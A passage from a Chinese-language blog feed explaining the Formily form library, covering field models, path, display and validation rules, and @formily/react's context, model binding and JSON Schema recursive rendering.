class_">Dependencies</span>, <span class="hljs-title class_">Reactions</span>)<br></code></pre></td></tr></table></figure><p>简化了很多，核心就是针对依赖数据变化做响应，依赖的数据可以是表单模型属性，也可以是任意字段模型的属性，响应的动作可以是改任意字段模型的属性，也可以是做其他异步动作。这样的模型同样是一个完备的联动模型，只是在一对多场景下，比起主动模型而言，实现成本会比较高。</p><p>所以，两种联动模型，需要用户根据自身需求来选择。</p><h5 id="路径系统-1"><a href="#路径系统-1" class="headerlink" title="路径系统"></a>路径系统</h5><p>路径系统，非常重要，几乎整个表单模型处处都有用到路径系统，它的主要给表单模型提供了以下几个能力：</p><ul><li>它可以用来从字段集中查找任意一个字段，同时支持按照规则批量查找</li><li>它可以用来表达字段间关系的模型，借助路径系统，我们可以实现查找某个字段父亲，能查找父亲，也就能实现树级别的数据继承能力，同样，我们也能查找某个字段的相邻节点</li><li>它可以用来实现字段数据的读写，带解构的数据读写</li></ul><p>整个路径系统，其实是基于@formily&#x2F;path 的路径 DSL 来实现的，想要了解更多路径系统的内容，可以详细看看<a href="https://core.formilyjs.org/api/entry/form-path">FormPath API</a>篇</p><h4 id="字段模型-1"><a href="#字段模型-1" class="headerlink" title="字段模型"></a>字段模型</h4><p>Formily 的字段模型核心包含了两类字段模型：</p><ul><li>数据型字段</li><li>虚数据型字段</li></ul><p>数据型字段(Field)，核心是负责维护表单数据(表单提交时候的值)。</p><p>虚数据型字段(VoidField)，你可以理解为它就是一个阉割了数据维护能力的 Field，所以它更多的是作为容器维护一批字段的 UI 形式。</p><p>下面我们具体分析这两种类型字段。</p><h5 id="数据型字段"><a href="#数据型字段" class="headerlink" title="数据型字段"></a>数据型字段</h5><p>在 字段模型 中有 3 种数据型字段：</p><ul><li>Field</li><li>ArrayField</li><li>ObjectField</li></ul><p>ArrayField 和 ObjectField 都是继承自 Field，Field 的定位就是维护非自增型数据字段，对比 ArrayField&#x2F;Object，并不是说 Field 就不能存数组类型或者对象类型的数据，Field 其实可以存任意数据类型的数据，只是，如果用户期望实现数组的添加删除移动这样的交互，则需要使用 ArrayField，对象属性的添加删除交互，则需要使用 ObjectField，如果没有这样的需求，所有数据类型统一用 Field 即可。</p><p>然后咱们再看具体 Field 领域规则：</p><ul><li>路径规则</li><li>显隐规则</li><li>数据读写规则</li><li>数据源规则</li><li>字段组件规则</li><li>字段装饰器规则</li><li>校验规则</li></ul><h5 id="路径规则"><a href="#路径规则" class="headerlink" title="路径规则"></a>路径规则</h5><p>因为我们实际业务的表单结构本身就是一个树结构，所以在 Formily 中，每个字段在表单模型中都会有一个绝对路径，这个绝对路径大致描述了字段在表单数据中的位置(为什么用大致，后面会讲)，通过绝对路径可以找到任意一个字段，同时还能表达字段间的父子关系，所以字段模型中，我们定义了 address 属性来表达字段的绝对路径，主要用点语法来描述，比如 a.b.c 这样的路径代表了字段 c 的父亲是字段 b，字段 b 的父亲是 a。</p><p>当然，事情并没有这么简单，因为我们还有 VoidField，VoidField 作为虚数据字段，它同样也有自己的绝对路径，因为它可以作为数据字段的父亲，如果我们只有绝对路径， 就无法让一个数据字段正确的往表单数据里写入字段数据。读取数据也会读错位置。</p><p>所以，我们其实还需要一个数据路径作为专门用于数据字段写入数据和读取数据的，这里我们用 path 来描述字段的数据路径，大概的规则可以看看这张图：</p><p><img src="https://img.alicdn.com/imgextra/i1/O1CN01cdzULJ1et4PBak8si_!!6000000003928-2-tps-3506-2042.png" alt="img"></p><p>总结下来就是，Address 永远是代表节点的绝对路径，Path 是会跳过 VoidField 的节点路径，但是如果是 VoidField 的 Path，是会保留它自身的路径位置。</p><p>所以，不管是 Field 还是 VoidField，都会有它的 Address 和 Path，所以我们在用 query 方法查询字段的时候，既可以用 Address 规则查询，也可以用 Path 规则查询，比如<code>query(&quot;b.c&quot;)</code>可以查询到 c 字段，同样用<code>query(&quot;a.b.c&quot;)</code>也能查询到 c 字段。</p><h5 id="显隐规则"><a href="#显隐规则" class="headerlink" title="显隐规则"></a>显隐规则</h5><p>字段的显示隐藏，主要用 display 属性来表达：</p><ul><li>display 为 none 代表字段 UI 隐藏，同时不保留字段数据</li><li>display 为 hidden 代表字段 UI 隐藏，保留字段数据</li><li>display 为 visible 代表字段 UI 显示，同时恢复字段数据</li></ul><p>在 display 属性之上，我们还提供了两个便捷属性</p><ol><li>visible，如果为 true 代表 display 等于 visible，如果为 false 代表 display 等于 none</li><li>hidden，如果为 true 代表 display 等于 hidden，如果为 false 代表 display 等于 visible</li></ol><p>上面讲的是显隐属性的写规则，读取规则就会更复杂一些，这里有一个默认继承逻辑：</p><p>如果父节点主动设置了 display 属性，子节点没有主动设置 display 属性，那么子节点会继承父节点的 display</p><p>那什么才是主动设置 display 呢？主要包括：</p><ul><li>给字段配置了初始化属性 display&#x2F;visible&#x2F;hidden</li><li>如果初始化时没有配置，但是在后期又给字段设置了 display&#x2F;visible&#x2F;hidden</li></ul><p>那如果希望从不继承变为继承怎么办？把 display 设置为 null 即可。</p><h5 id="数据读写规则"><a href="#数据读写规则" class="headerlink" title="数据读写规则"></a>数据读写规则</h5><p>因为 Field 是数据型字段，它负责维护表单数据的某个节点的数据，这里的读取，其实是直接读取的表单数据，通过 path 属性来寻址，这样也保证了表单数据与字段数据的绝对幂等，读取的方式直接读取 value&#x2F;initialValue 即可。</p><p>数据写入规则与读取规则一致，Field 不会独立维护一份数据，它操作的直接就是具体表单的数据，通过 path 属性来寻址，写入的方式主要有：</p><ul><li>直接修改 value&#x2F;initialValue 属性</li><li>调用 onInput 会写入数据，同时设置字段的 inputValue 为入参数据，inputValues 为多参数据，然后设置 modified 属性为 true，代表该字段被手动修改过，最后触发 triggerType 为 onInput 的校验规则</li><li>调用 setValue 方法</li></ul><h5 id="数据源规则"><a href="#数据源规则" class="headerlink" title="数据源规则"></a>数据源规则</h5><p>考虑到字段的值来源不是只有通过 Input 输入框输入的，还有会从一个数据源中选取的，比如下拉框之类的，所以字段模型加了一个数据源的属性 dataSource，专门用于读取数据源。只是在组件消费端需要做一层映射。写入数据源的方式可以直接修改 dataSource 属性，也可以调用 setDataSource 方法</p><h5 id="组件规则"><a href="#组件规则" class="headerlink" title="组件规则"></a>组件规则</h5><p>字段模型，如果没有代理 UI 组件信息，那就没法实现更加精细化的联动控制了，比如 A 字段的值变化要控制 B 字段的 placeholder，那就必须将字段的属性给代理起来，所以 formily 提供了 component 属性，专门用于代理 UI 组件信息，component 是一个数组<code>[Component,ComponentProps]</code>，第一个元素代表是哪个组件，第二个代表组件的属性有哪些，为什么用数组，主要原因是这样方便类型提示，同时写法也比较简单。</p><p>读取组件信息的方式直接读取 component 属性即可。</p><p>写入组件信息的方式主要有：</p><ul><li>直接修改 component 属性，传入数组</li><li>调用 setComponent 方法，第一个参数是组件，第二个是组件属性</li><li>调用 setComponentProps 方法，直接会设置组件属性</li></ul><h5 id="装饰器规则"><a href="#装饰器规则" class="headerlink" title="装饰器规则"></a>装饰器规则</h5><p>与字段组件规则相似，字段装饰器主要用来维护字段的包裹容器，比如 FormItem，更偏 UI 布局的控制，这里我们用 decorator 属性来描述字段装饰器。</p><p>读取装饰器信息的方式直接读取 decorator 属性即可。</p><p>写入装饰器信息的方式主要有：</p><ul><li>直接修改 decorator 属性，传入数组</li><li>调用 setDecorator 方法，第一个参数是组件，第二个是组件属性</li><li>调用 setDecoratorProps 方法，直接会设置组件属性</li></ul><h5 id="校验规则"><a href="#校验规则" class="headerlink" title="校验规则"></a>校验规则</h5><p>校验规则主要包含：</p><ul><li>校验器</li><li>校验时机</li><li>校验策略</li><li>校验结果</li></ul><p>校验器</p><p>在字段模型中的校验器主要用 validator 属性描述，在字段初始化的时候可以给字段传入 validator，初始化之后也可以再次修改 validator</p><p>一个 validator 主要有以下几种形态：</p><ul><li>纯字符串格式校验，比如<code>&quot;phone&quot; | validator = &quot;url&quot; | validator= &quot;email&quot;</code> ，这样的格式校验是正则规则的简写形式，formily 内部提供了一些标准的正则规则，当然用户也能通过 registerValidateFormats 来手动创建规则，方便复用</li><li>自定义函数校验，有 3 种返回值模式：<ul><li><code>(value)=&gt;&quot;message&quot;</code>，返回字符串代表有错误，不返回字符串代表无错误</li><li><code>(value)=&gt;(&#123;type:&quot;error&quot;,message:&quot;message&quot;&#125;)</code>，返回对象形式，可以指定 type 是 error 或 warning 或 success</li><li><code>&#123;validator:()=&gt;false,message:&quot;message&quot;&#125;</code>，返回布尔形式，错误消息会复用对象结构的 message 字段</li></ul></li><li>对象结构校验，是一种更完备的表达，比如：<ul><li><code>&#123;format:&quot;url&quot;&#125;</code> 这样可以指定正则格式</li><li><code>&#123;required:true&#125;</code>这样可以指定必填</li><li>还有更多的规则属性可以参考 API 文档，同时我们还能通过 registerValidateRules 来注册类似的校验规则</li></ul></li><li>对象数组结构校验，是前面三种的组合表达，其实前 3 种，都会转换成对象数组结构，比如：<ul><li><code>[&quot;url&quot;,&#123;required:true&#125;,(value)=&gt;&quot;message&quot;]</code>其实相当于 <code>[&#123;format:&quot;url&quot;&#125;,&#123;required:true&#125;,&#123;validator:(value)=&gt;&quot;message&quot;&#125;]</code></li></ul></li></ul><p>校验时机</p><p>有些时候，我们希望某些校验规则只在聚焦或者失焦的时候触发，我们可以在每个校验规则对象中加一个 triggerType，比如<code>&#123;validator:(value)=&gt;&quot;message&quot;,triggerType:&quot;onBlur&quot;&#125;</code> 这样就可以精确的控制某个校验规则只在某个事件中执行校验，这里的 triggerType 主要有<code>&quot;onInput&quot; | &quot;onBlur&quot; | &quot;onFocus&quot;</code> ，如果调用<code>form.validate</code>，是会一次性校验所有 triggerType 的规则，如果手动调用<code>field.validate</code>，则可以在入参中指定 triggerType，不传参就会校验所有。</p><p>校验策略</p><p>有些时候，我们希望某个字段的校验策略是，执行所有校验规则的时候，如果某个校验规则校验失败则立即返回结果，我们只需要在 field 初始化的时候传入参数 validateFirst 为 true 即可，默认是 false，也就是校验失败也会继续校验，拿到的校验结果是一个数组。</p><p>校验结果读取</p><p>对于校验结果，在字段模型中主要是存放在 feedbacks 属性中的，feedbacks 是由 Feedback 对象组成的数组，每个 Feedback 的结构是：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Feedback</span> &#123;<br>  <span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">//字段数据路径</span><br>  <span class="hljs-attr">address</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">//字段绝对路径</span><br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span> | <span class="hljs-string">&#x27;success&#x27;</span> | <span class="hljs-string">&#x27;warning&#x27;</span> <span class="hljs-comment">//校验结果类型</span><br>  <span class="hljs-attr">code</span>: <span class="hljs-comment">//校验结果编码</span><br>  | <span class="hljs-string">&#x27;ValidateError&#x27;</span><br>    | <span class="hljs-string">&#x27;ValidateSuccess&#x27;</span><br>    | <span class="hljs-string">&#x27;ValidateWarning&#x27;</span><br>    | <span class="hljs-string">&#x27;EffectError&#x27;</span><br>    | <span class="hljs-string">&#x27;EffectSuccess&#x27;</span><br>    | <span class="hljs-string">&#x27;EffectWarning&#x27;</span><br>  <span class="hljs-attr">messages</span>: <span class="hljs-built_in">string</span>[] <span class="hljs-comment">//校验消息</span><br>&#125;<br></code></pre></td></tr></table></figure><p>读取方式主要有 4 种：</p><ul><li>直接读取 feedbacks 属性</li><li>读取 errors 属性，相当于是从 feedbacks 中过滤出 type 为 error 的所有校验结果</li><li>读取 warnings 属性，相当于是从 feedbacks 中过滤出 type 为 warning 的所有校验结果</li><li>读取 successes 属性，相当于是从 feedbacks 中过滤出 type 为 success 的所有校验结果</li></ul><p>校验结果写入</p><p>写入方式有 3 种：</p><ul><li>调用 validate 方法，触发字段校验器执行校验动作，校验结果的 Code 统一是 Validate*&#96;<ul><li>调用 onInput 会触发 validate</li><li>调用 onFocus 会触发 validate</li><li>调用 onBlur 会触发 validate</li><li>调用 reset，并指定 validate 为 true 会触发 validate</li></ul></li><li>直接修改 feedbacks 属性</li><li>直接修改 errors 属性，会转换成 feedbacks 对象数组，同时 Feedback 的 code 会被强制覆盖为 EffectError</li><li>直接修改 warnings 属性，会转换成 feedbacks 对象数组，同时 Feedback 的 code 会被强制覆盖为 EffectWarning</li><li>直接修改 successes 属性，会转换成 feedbacks 对象数组，同时 Feedback 的 code 会被强制覆盖为 EffectSuccess</li></ul><p>这样的写入逻辑主要是为了防止用户修改校验结果污染本身校验器的校验结果，做严格分离，容易恢复现场。</p><p>校验结果查询</p><p>校验结果的查询主要通过 queryFeedbacks 来查询，查询的入参与 Feedback 对象一致，可以按照 type 或者 code，也可以按照路径进行过滤。</p><h5 id="ArrayField"><a href="#ArrayField" class="headerlink" title="ArrayField"></a>ArrayField</h5><p>ArrayField 相比于 Field，仅仅只是在继承 Field 的基础上扩展了数组相关的方法，比如 push&#x2F;pop&#x2F;insert&#x2F;move 这些，为什么要提供这些方法，它的能力不只是对字段的数据做处理，它内部还提供了对 ArrayField 子节点的状态转置处理主要为了保证字段的顺序与数据的顺序是一致。可以举个例子：</p><p><img src="https://img.alicdn.com/imgextra/i3/O1CN01mpGugu1QFlnfQ4qfo_!!6000000001947-2-tps-3506-1794.png" alt="img"></p><p>这是一个 move 调用的过程，数组元素的值会发生移动，同时对应字段的状态也会发生移动。</p><h5 id="ObjectField"><a href="#ObjectField" class="headerlink" title="ObjectField"></a>ObjectField</h5><p>因为 object 类型是无序的，也就不存在状态转置，所以 ObjectField 就提供了 addProperty&#x2F;removeProperty&#x2F;existProperty 3 个 API 给用户使用。</p><h5 id="VoidField"><a href="#VoidField" class="headerlink" title="VoidField"></a>VoidField</h5><p>VoidField 相比于 Field，主要是阉割了数据读写规则、数据源规则和校验规则，用户使用的时候，主要还是使用显隐规则和组件，装饰器规则。</p><p>前面讲的一系列字段领域规则，并没有提到详细的 API 使用细节，更多的是从思路上帮助用户梳理 formily，如果对 API 不熟悉的，最好先看 API 文档。</p><h2 id="6、基础核心库：react"><a href="#6、基础核心库：react" class="headerlink" title="6、基础核心库：react"></a>6、基础核心库：react</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>@formily&#x2F;react 的核心定位是将 ViewModel(<a href="https://core.formilyjs.org/">@formily&#x2F;core</a>)与组件实现一个状态绑定关系，它不负责管理表单数据，表单校验，它仅仅是一个渲染胶水层，但是这样一层胶水，并不脏，它会把很多脏逻辑优雅的解耦，变得可维护。</p><p>@formily&#x2F;react 的架构相比于@formily&#x2F;core 并不复杂，先看架构图：</p><p><img src="https://img.alicdn.com/imgextra/i1/O1CN013jbRfk1l5n6N7jYH8_!!6000000004768-55-tps-2200-1637.svg" alt="img"></p><p>从这张架构图中我们可以看到，@formily&#x2F;react 支持了两类用户，一类就是纯源码开发用户，他们只需要使用 Field&#x2F;ArrayField&#x2F;ObjectField&#x2F;VoidField 组件。另一类就是基于 JSON-Schema 做动态开发的用户，他们依赖的主要是 SchemaField 组件，但是，这两类用户都需要使用一个 FormProvider 的组件来统一下发上下文。然后是 SchemaField 组件，它内部其实是依赖的 Field&#x2F;ArrayField&#x2F;ObjectField&#x2F;VoidField 组件。</p><h3 id="核心概念-1"><a href="#核心概念-1" class="headerlink" title="核心概念"></a>核心概念</h3><p>@formily&#x2F;react 本身架构不复杂，因为它只是提供了一系列的组件和 Hooks 给用户使用，但是我们还是需要理解以下几个概念：</p><ul><li>表单上下文</li><li>字段上下文</li><li>协议上下文</li><li>模型绑定</li><li>协议驱动</li><li>三种开发模式</li></ul><h4 id="表单上下文"><a href="#表单上下文" class="headerlink" title="表单上下文"></a>表单上下文</h4><p>从<a href="https://react.formilyjs.org/guide/architecture">架构图</a>中我们可以看到 FormProvider 是作为表单统一上下文而存在，它的地位非常重要，主要用于将@formily&#x2F;core 创建出来的<a href="https://core.formilyjs.org/zh-CN/api/models/form">Form</a>实例下发到所有子组件中，不管是在内置组件还是用户扩展的组件，都能通过<a href="https://react.formilyjs.org/api/hooks/use-form">useForm</a>读取到<a href="https://core.formilyjs.org/zh-CN/api/models/form">Form</a>实例</p><h4 id="字段上下文"><a href="#字段上下文" class="headerlink" title="字段上下文"></a>字段上下文</h4><p>从<a href="https://react.formilyjs.org/guide/architecture">架构图</a>中我们可以看到不管是 Field&#x2F;ArrayField&#x2F;ObjectField&#x2F;VoidField，会给子树下发一个 FieldContext，我们可以在自定义组件中读取到当前字段模型，主要是使用<a href="https://react.formilyjs.org/api/hooks/use-field">useField</a>来读取，这样非常方便于做模型映射</p><h4 id="协议上下文"><a href="#协议上下文" class="headerlink" title="协议上下文"></a>协议上下文</h4><p>从<a href="https://react.formilyjs.org/guide/architecture">架构图</a>中我们可以看到<a href="https://react.formilyjs.org/api/components/recursion-field">RecursionField</a>会给子树下发一个 FieldSchemaContext，我们可以在自定义组件中读取到当前字段的 Schema 描述，主要是使用<a href="https://react.formilyjs.org/api/hooks/useFieldSchema">useFieldSchema</a>来读取。注意，该 Hook 只能用在<a href="https://react.formilyjs.org/api/components/SchemaField">SchemaField</a>和<a href="https://react.formilyjs.org/api/components/recursion-field">RecursionField</a>子树中使用</p><h4 id="模型绑定"><a href="#模型绑定" class="headerlink" title="模型绑定"></a>模型绑定</h4><p>想要理解模型绑定，需要先理解什么是<a href="https://core.formilyjs.org/zh-CN/guide/mvvm">MVVM</a>，理解了之后我们再看看这张图：</p><p><img src="https://img.alicdn.com/imgextra/i1/O1CN01A03C191KwT1raxnDg_!!6000000001228-55-tps-2200-869.svg" alt="img"></p><p>在 Formily 中，@formily&#x2F;core 就是 ViewModel，Component 和 Decorator 就是 View，@formily&#x2F;react 就是将 ViewModel 和 View 绑定起来的胶水层，ViewModel 和 View 的绑定就叫做模型绑定，实现模型绑定的手段主要有<a href="https://react.formilyjs.org/api/hooks/use-field">useField</a>，也能使用<a href="https://react.formilyjs.org/api/shared/connect">connect</a>和<a href="https://react.formilyjs.org/api/shared/map-props">mapProps</a>，需要注意的是，Component 只需要支持 value&#x2F;onChange 属性即可自动实现数据层的双向绑定。</p><h4 id="协议驱动-1"><a href="#协议驱动-1" class="headerlink" title="协议驱动"></a>协议驱动</h4><p>协议驱动渲染算是@formily&#x2F;react 中学习成本最高的部分了，但是学会了之后，它给业务带来的收益也是很高，总共需要理解 4 个核心概念：</p><ul><li>Schema</li><li>递归渲染</li><li>协议绑定</li><li>三种开发模式</li></ul><h4 id="Schema"><a href="#Schema" class="headerlink" title="Schema"></a>Schema</h4><p>formily 的协议驱动主要是基于标准 JSON Schema 来进行驱动渲染的，同时我们在标准之上又扩展了一些<code>x-*</code>属性来表达 UI，使得整个协议可以具备完整描述一个复杂表单的能力，具体 Schema 协议，参考<a href="https://react.formilyjs.org/api/shared/schema">Schema</a> API 文档</p><h4 id="递归渲染"><a href="#递归渲染" class="headerlink" title="递归渲染"></a>递归渲染</h4><p>何为递归渲染？递归渲染就是组件 A 在某些条件下会继续用组件 A 来渲染内容，看看以下伪代码：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：object；渲染权：RecursionField)<br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：string；渲染权：RecursionField)<br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Input&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;phone&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：string；渲染权：RecursionField)<br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-validator&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：string；渲染权：RecursionField)<br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-validator&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;contacts&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：array；渲染权：RecursionField)<br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;array&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ArrayTable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;items&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：object；渲染权：ArrayTable组件)<br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：string；渲染权：RecursionField)<br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Input&quot;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;phone&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：string；渲染权：RecursionField)<br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;x-validator&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> &lt;---- RecursionField(条件：string；渲染权：RecursionField)<br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;x-component&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Input&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;x-validator&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>@formily&#x2F;react 递归渲染的入口是<a href="https://react.formilyjs.org/api/components/schema-field">SchemaField</a>，但它内部实际是使用 <a href="https://react.formilyjs.org/api/components/recursion-field">RecursionField</a> 来渲染的，因为 JSON-Schema 就是一个递归型结构，所以 <a href="https://react.formilyjs.org/api/components/recursion-field">RecursionField</a> 在渲染的时候会从顶层 Schema 节点解析，如果是非 object 和 array 类型则直接渲染具体组件，如果是 object，则会遍历 properties 继续用 <a href="https://react.formilyjs.org/api/components/recursion-field">RecursionField</a> 渲染子级 Schema 节点。</p><p>这里有点特殊的情况是 array 类型的自增列表渲染，需要用户在自定义组件内使用<a href="https://react.formilyjs.org/api/components/recursion-field">RecursionField</a>进行递归渲染，因为自增列表的 UI 个性化定制程度很高，所以就把递归渲染权交给用户来渲染了，这样设计也能让协议驱动渲染变得更加灵活。</p><p>那 SchemaField 和 RecursionField 有啥差别呢？主要有两点：</p><ul><li>SchemaField 是支持 Markup 语法的，它会提前解析 Markup 语法生成<a href="https://react.formilyjs.org/api/shared/schema">JSON Schema</a>移交给 RecursionField 渲染，所以 RecursionField 只能基于 <a href="https://react.formilyjs.org/api/shared/schema">JSON Schema</a> 渲染</li><li>SchemaField 渲染的是整体的 Schema 协议，而 RecursionField 渲染的是局部 Schema 协议</li></ul><h4 id="协议绑定"><a href="#协议绑定" class="headerlink" title="协议绑定"></a>协议绑定</h4><p>前面讲了模型绑定，而协议绑定则是将 Schema 协议转换成模型绑定的过程，因为 JSON-Schema 协议是 JSON 字符串，可离线存储的，而模型绑定则是内存间的绑定关系，是 Runtime 层的，比如<code>x-component</code>在 Schema 中是组件的字符串标识，但是在模型中的 component 则是需要组件引用，所以 JSON 字符串与 Runtime 层是需要转换的。然后我们就可以继续完善一下以上模型绑定的图：</p><p><img src="https://img.alicdn.com/imgextra/i3/O1CN01jLCRxH1aa3V0x6nw4_!!6000000003345-55-tps-2200-1147.svg" alt="img"></p><p>总结下来，在@formily&#x2F;react 中，主要有 2 层绑定关系，Schema 绑定模型，模型绑定组件，实现绑定的胶水层就是@formily&#x2F;react，需要注意的是，Schema 绑定字段模型之后，字段模型中是感知不到 Schema 的，比如要修改<code>enum</code>，就是修改字段模型中的<code>dataSource</code>属性了，总之，想要更新字段模型，参考<a href="https://core.formilyjs.org/zh-CN/api/models/field">Field</a>，想要理解 Schema 与字段模型的映射关系可以参考<a href="https://react.formilyjs.org/api/shared/schema">Schema</a>文档</p><h4 id="三种开发模式"><a href="#三种开发模式" class="headerlink" title="三种开发模式"></a>三种开发模式</h4><p>从<a href="https://react.formilyjs.org/guide/architecture">架构图</a>中我们其实已经看到整个@formily&#x2F;react 是有三种开发模式的，对应不同用户：</p><ul><li>JSX 开发模式</li><li>JSON Schema 开发模式</li><li>Markup Schema 开发模式</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>formily</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面试题总结</title>
    <link href="/blog/2023/09/19/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2023/09/19/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
